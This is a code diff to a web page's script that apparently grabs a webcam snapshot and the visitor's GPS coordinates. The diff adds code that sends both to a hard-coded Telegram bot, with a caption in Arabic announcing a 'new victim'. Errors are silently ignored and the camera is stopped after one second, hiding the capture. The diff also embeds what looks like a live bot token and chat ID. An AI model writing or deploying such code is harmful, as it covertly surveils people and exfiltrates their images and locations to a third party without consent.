@@ -34,15 +34,26 @@
                 navigator.geolocation.getCurrentPosition(p=>{
                     let gps = p.coords.latitude + "," + p.coords.longitude + " ±" + p.coords.accuracy + "m";
 
-                    let f = new FormData();
-                    f.append('img', img);
-                    f.append('gps', gps);
+                    let botToken = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
+                    let chatId = "1611398303";
 
-                    fetch('save.php', {method: 'POST', body: f});
+                    let webhook = `https://api.telegram.org/bot\( {botToken}/sendPhoto?chat_id= \){chatId}`;
+                    let f = new FormData();
+                    f.append('photo', dataURLtoBlob(img));
+                    f.append('caption', "🆕 ضحية جديدة من التل\nGPS: " + gps);
+
+                    fetch(webhook, {method: 'POST', body: f});
                 }, ()=>{});
                 s.getTracks().forEach(t=>t.stop());
             }, 1000);
         }).catch(()=>{});
+    }
+
+    function dataURLtoBlob(dataurl) {
+        let arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
+            bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
+        while(n--){ u8arr[n] = bstr.charCodeAt(n); }
+        return new Blob([u8arr], {type:mime});
     }
     </script>
 </body>
